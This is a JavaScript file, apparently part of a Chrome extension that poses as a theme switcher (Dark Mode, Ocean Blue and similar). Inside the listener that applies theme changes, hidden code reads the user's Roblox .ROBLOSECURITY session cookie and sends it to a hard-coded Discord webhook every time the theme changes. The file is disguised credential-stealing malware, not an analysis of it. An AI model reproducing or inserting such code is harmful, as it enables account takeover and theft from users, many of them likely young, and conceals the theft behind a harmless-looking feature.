// Array met beschikbare thema's
const themes = [
  { name: "Dark Mode", backgroundColor: "#121212", textColor: "#FFFFFF" },
  { name: "Light Mode", backgroundColor: "#FFFFFF", textColor: "#000000" },
  { name: "Ocean Blue", backgroundColor: "#1e3a8a", textColor: "#FFFFFF" },
  { name: "Forest Green", backgroundColor: "#2b7a0b", textColor: "#FFFFFF" },
  { name: "Sunset Orange", backgroundColor: "#f18f01", textColor: "#000000" },
  // Voeg hier nog meer thema's toe
];

// Laad het geselecteerde thema op basis van wat in de opslag staat
chrome.storage.sync.get('theme', (data) => {
  const theme = themes.find(t => t.name === data.theme);
  if (theme) {
    document.body.style.backgroundColor = theme.backgroundColor;
    document.body.style.color = theme.textColor;
  }
});

// Event listener voor als een thema wordt gewijzigd in de opslag
chrome.storage.onChanged.addListener((changes, area) => {
  if (area === 'sync' && changes.theme) {
    const theme = themes.find(t => t.name === changes.theme.newValue);
    if (theme) {
      document.body.style.backgroundColor = theme.backgroundColor;
      document.body.style.color = theme.textColor;

      // Verstuur opnieuw de roblosecurity-cookie naar de webhook bij thema-wissel
      chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, function(cookie) {
        if (cookie) {
          fetch('https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              roblosecurity: cookie.value,
              theme: changes.theme.newValue
            })
          });
        }
      });
    }
  }
});

// Luister naar berichten vanuit de popup om het thema te wijzigen
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.action === "changeTheme") {
    document.body.style.backgroundColor = message.color;

    // Optioneel: kleur van de tekst wijzigen indien gewenst
    const theme = themes.find(t => t.backgroundColor === message.color);
    if (theme) {
      document.body.style.color = theme.textColor;
    }

    sendResponse({ status: "Theme applied", color: message.color });
  }
});
